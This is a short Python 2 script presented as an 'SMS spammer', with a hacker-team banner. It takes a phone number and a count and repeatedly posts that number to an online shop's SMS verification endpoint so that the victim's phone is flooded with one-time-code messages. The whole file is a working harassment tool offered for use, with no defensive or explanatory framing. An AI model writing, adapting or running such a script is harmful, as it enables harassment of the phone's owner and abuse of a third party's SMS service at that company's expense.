# spam.py - Spammer SMS
# CyberLegacyXploit

import sys
import time
import requests

tes= """
  _____ ____    ____  ___ ___  ___ ___    ___  ____  
 / ___/|    \  /    T|   T   T|   T   T  /  _]|    \ 
(   \_ |  o  )Y  o  || _   _ || _   _ | /  [_ |  D  )
 \__  T|   _/ |     ||  \_/  ||  \_/  |Y    _]|    / 
 /  \ ||  |   |  _  ||   |   ||   |   ||   [_ |    \ 
 \    ||  |   |  |  ||   |   ||   |   ||     T|  .  Y
  \___jl__j   l__j__jl___j___jl___j___jl_____jl__j\_j
             _____ ___ ___  _____
            / ___/|   T   T/ ___/
           (   \_ | _   _ (   \_ 
            \__  T|  \_/  |\__  T
            /  \ ||   |   |/  \ |
            \    ||   |   |\    |
             \___jl___j___j \___j
Author : jack
Team : A-team
"""
def spam():
	jumlah=sys.argv[1].split("=")[1:]
	jumlah=jumlah[0]
	jumlah=int(jumlah)
	phone=sys.argv[2]
	print tes
	param = {'phone':''+sys.argv[2],'smsType':'1'}
	count = 0
	while (count < jumlah):
		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
		if '"success":true' in r.text:
			print("Terkirim :D")
		else:
			print("Gagal Mengirim :(")
		time.sleep(1)
		count = count + 1
	print("Successful^-^")
	sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print tes
		print "Usage: spam.py --count=10 NoHP"
		sys.exit(0)
	else:
		spam()
